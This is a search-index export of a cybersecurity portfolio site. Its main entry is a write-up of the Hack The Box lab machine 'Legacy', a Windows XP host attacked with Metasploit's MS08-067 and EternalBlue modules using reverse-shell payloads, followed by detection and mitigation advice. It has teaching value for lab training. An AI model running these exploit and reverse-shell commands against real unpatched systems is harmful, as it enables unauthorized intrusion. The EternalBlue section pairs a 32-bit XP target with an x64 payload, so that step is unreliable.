
[{"content":" Machine Overview #\rLegacy is a beginner-friendly Windows machine that demonstrates the impact of unpatched systems. This machine is vulnerable to several critical SMB exploits including MS08-067 and MS17-010 (EternalBlue).\nTarget Details:\nIP Address: 10.10.10.4 Operating System: Windows XP SP3 Difficulty: Easy Points: 20 Release Date: March 2017 Initial Reconnaissance #\rPort Scanning #\rStarting with an initial Nmap scan to identify open ports and services:\nnmap -sC -sV -oN nmap/initial.txt 10.10.10.4 Results:\nStarting Nmap 7.94 ( https://nmap.org ) Nmap scan report for 10.10.10.4 Host is up (0.045s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Host script results: |_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:81:18 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 | System time: 2025-07-25T18:57:39+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported | message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required SMB Enumeration #\rLet\u0026rsquo;s enumerate the SMB service more thoroughly:\n# Check for SMB vulnerabilities nmap --script smb-vuln* -p 445 10.10.10.4 Critical Findings:\nHost script results: | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, | Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta | allows remote attackers to execute arbitrary code via a crafted RPC request | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 Exploitation Strategy #\rThe machine is vulnerable to multiple critical SMB exploits. We have two main options:\nMS08-067 - Netapi vulnerability (older, more reliable) MS17-010 - EternalBlue exploit (newer, more famous) Method 1: MS08-067 Exploitation #\rSetting up Metasploit #\rmsfconsole use exploit/windows/smb/ms08_067_netapi set RHOSTS 10.10.10.4 set LHOST tun0 show options Payload Selection #\rset payload windows/shell_reverse_tcp set LHOST 10.10.14.15 exploit Success! We get a shell immediately:\nC:\\WINDOWS\\system32\u0026gt;whoami nt authority\\system C:\\WINDOWS\\system32\u0026gt;hostname legacy Method 2: MS17-010 (EternalBlue) #\rFor educational purposes, let\u0026rsquo;s also demonstrate the EternalBlue exploit:\n# Using Metasploit use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.4 set LHOST 10.10.14.15 set payload windows/x64/shell_reverse_tcp exploit Post-Exploitation #\rSystem Information #\rC:\\WINDOWS\\system32\u0026gt;systeminfo Host Name: LEGACY OS Name: Microsoft Windows XP Professional OS Version: 5.1.2600 Service Pack 3 Build 2600 System Type: X86-based PC Flag Collection #\rUser Flag #\rSince we have SYSTEM access, we can access any user\u0026rsquo;s files:\nC:\\WINDOWS\\system32\u0026gt;dir C:\\Documents and Settings\\john\\Desktop\\ Volume in drive C has no label. Directory of C:\\Documents and Settings\\john\\Desktop 16/03/2017 08:32 \u0026lt;DIR\u0026gt; . 16/03/2017 08:32 \u0026lt;DIR\u0026gt; .. 16/03/2017 08:32 32 user.txt C:\\WINDOWS\\system32\u0026gt;type \u0026#34;C:\\Documents and Settings\\john\\Desktop\\user.txt\u0026#34; e69af0e4f443de72dcb□□□□□□□□□□□□□□□□ Root Flag #\rC:\\WINDOWS\\system32\u0026gt;type \u0026#34;C:\\Documents and Settings\\Administrator\\Desktop\\root.txt\u0026#34; 993442d258b0e0ec917c□□□□□□□□□□□□□□□□ Vulnerability Analysis #\rMS08-067 Technical Details #\rThe MS08-067 vulnerability exists in the Server service\u0026rsquo;s handling of RPC requests. Here\u0026rsquo;s what makes it dangerous:\nKey Points:\nCVE ID: CVE-2008-4250 CVSS Score: 10.0 (Critical) Affected Systems: Windows 2000, XP, Server 2003, Vista Attack Vector: Network (RPC over SMB) Authentication Required: None MS17-010 (EternalBlue) Details #\rOriginally developed by the NSA and leaked by the Shadow Brokers group:\nImpact Assessment:\nWormable: Can spread automatically across networks Authentication: Not required Privilege Level: SYSTEM (highest) Notable Usage: WannaCry and NotPetya ransomware Detection and Mitigation #\rDetection Methods #\rNetwork-based detection signatures:\n# Snort rule for MS08-067 alert tcp any any -\u0026gt; any 445 (msg:\u0026#34;MS08-067 Exploit Attempt\u0026#34;; content:\u0026#34;|ff|SMB|25|\u0026#34;; offset:4; depth:5; sid:100001;) Mitigation Strategies #\rPatch Management\nApply MS08-067 security update immediately Implement automated patching policies Network Segmentation\nRestrict SMB traffic between network segments Use firewalls to block ports 139 and 445 externally SMB Configuration\nDisable SMBv1 protocol entirely Enable SMB signing where possible Monitoring\nMonitor for unusual SMB traffic patterns Log failed authentication attempts Lessons Learned #\rTechnical Takeaways #\rPatch Management is Critical\nLegacy systems without patches are extremely vulnerable Even \u0026ldquo;air-gapped\u0026rdquo; systems can be compromised via physical access Defense in Depth\nMultiple security layers could have prevented this attack Network segmentation limits blast radius Vulnerability Disclosure Timeline\nMS08-067: Patched in October 2008 MS17-010: Patched in March 2017 Both were actively exploited in the wild Real-World Implications #\rThis machine demonstrates vulnerabilities that affected millions of systems:\nWannaCry Ransomware (2017): Used MS17-010 to spread globally Conficker Worm (2008): Leveraged MS08-067 for propagation Corporate Networks: Many organizations still run unpatched legacy systems Tools and Resources #\rTools Used #\rTool Purpose Command Example Nmap Port scanning \u0026amp; vulnerability detection nmap --script smb-vuln* -p 445 target Metasploit Exploitation framework use exploit/windows/smb/ms08_067_netapi Wireshark Network traffic analysis GUI-based packet capture Additional Resources #\rMicrosoft Security Bulletin MS08-067 MS17-010 Technical Analysis MITRE ATT\u0026amp;CK - Exploit Public-Facing Application Conclusion #\rLegacy demonstrates the severe impact of unpatched systems in production environments. Both MS08-067 and MS17-010 provide immediate SYSTEM-level access, highlighting the importance of:\nTimely patch management Network segmentation Vulnerability scanning Defense in depth strategies This machine serves as an excellent introduction to SMB exploitation techniques and emphasizes why legacy systems pose significant security risks.\nFinal Stats:\nTime to Root: ~15 minutes Difficulty Rating: 2/10 Key Learning: SMB vulnerability exploitation Next Steps: Try intermediate machines like Blue or Devel Remember: These techniques should only be used in authorized testing environments like Hack The Box, personal labs, or during legitimate penetration testing engagements.\n","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/defense/lab-1/","section":"Cybersecurity Writeups","summary":"","title":"HTB easy","type":"writeups"},{"content":" ","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/defense/","section":"Cybersecurity Writeups","summary":"","title":"defense","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/blue-team-labs/forensics/","section":"Cybersecurity Writeups","summary":"","title":"forensics","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/","section":"Cybersecurity Writeups","summary":"Defensive cybersecurity exercises and incident response","title":"Red Team","type":"writeups"},{"content":" ","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/","section":"Cybersecurity Writeups","summary":"","title":"Cybersecurity Writeups","type":"writeups"},{"content":" ","date":"18 July 2025","externalUrl":null,"permalink":"/writeups/blue-team-labs/","section":"Cybersecurity Writeups","summary":"Digital forensics, malware analysis and incident response","title":"Blue Team","type":"writeups"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/difficulties/","section":"Difficulties","summary":"","title":"Difficulties","type":"difficulties"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/difficulties/easy/","section":"Difficulties","summary":"","title":"Easy","type":"difficulties"},{"content":" Welcome to My Cybersecurity Portfolio #\rAbout Me #\rI\u0026rsquo;m a dedicated cybersecurity professional with expertise in both offensive and defensive security operations. My passion lies in understanding complex attack vectors, developing robust defense strategies, and sharing knowledge with the cybersecurity community.\n","date":"18 July 2025","externalUrl":null,"permalink":"/","section":"File Name","summary":"","title":"File Name","type":"page"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/platforms/hack-the-box/","section":"Platforms","summary":"","title":"Hack the Box","type":"platforms"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/platforms/","section":"Platforms","summary":"","title":"Platforms","type":"platforms"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/categories/red-team/","section":"Categories","summary":"","title":"Red Team","type":"categories"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"SMB","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/hack-the-box/","section":"Cybersecurity Writeups","summary":"","title":"hack-the-box","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/proving-grounds/","section":"Cybersecurity Writeups","summary":"","title":"proving-grounds","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/techniques/","section":"Techniques","summary":"","title":"Techniques","type":"techniques"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/virtual-hacking-labs/","section":"Cybersecurity Writeups","summary":"","title":"Virtual Hacking labs","type":"writeups"},{"content":" ","externalUrl":null,"permalink":"/writeups/red-team-ctfs/vulnlab/","section":"Cybersecurity Writeups","summary":"","title":"vulnlab","type":"writeups"}]